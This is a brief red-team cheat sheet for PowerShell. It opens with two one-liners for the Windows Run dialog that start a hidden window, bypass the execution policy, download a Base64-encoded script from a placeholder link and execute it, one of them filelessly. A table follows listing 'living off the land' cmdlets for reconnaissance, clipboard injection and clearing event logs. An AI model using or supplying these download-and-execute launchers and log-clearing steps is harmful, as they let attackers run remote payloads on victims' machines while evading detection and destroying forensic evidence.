# Red Team PowerShell

## Execute fileless Base64 encoded script from Run Dialog:

```powershell
powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
```

## Download and execute Base64 encoded script from Run Dialog:

```powershell
powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
```

------------------------------

# Living of the Land Cmdlets:

| Cmdlet                  | Description                                                                                          |
|-------------------------|------------------------------------------------------------------------------------------------------|
| Get-StartApps           | Used to retrieve a list of Start menu apps and tiles for the current user on a Windows operating system. |
| Set-Clipboard           | Used to set clipboard content. Essentially clipboard injection.                                       |
| Get-Clipboard           | Retrieve clipboard content.                                                                          |
| Get-LocalUser           | Return all local users on the system.                                                                |
| Get-NetFirewallProfile  | Gets properties for a firewall profile.                                                              |
| Get-NetFirewallRule     | Gets properties for a firewall rule.                                                                 |
| Get-ComputerInfo        | Retrieves all system and operating system properties from the computer                               |
| Get-Service             | Retrieves a list of all services on the computer                                                     |
| Get-EventLog            | Retrieves events and event logs from local and remote computers (only available in Windows PowerShell 5.1) |
| Get-Process             | Retrieves a list of all active processes on a local or remote computer                               |
| Clear-EventLog          | Deletes all of the entries from the specified event logs on the local computer or on remote computers |
| Clear-RecycleBin        | Deletes the content of a computer's recycle bin                                                       |
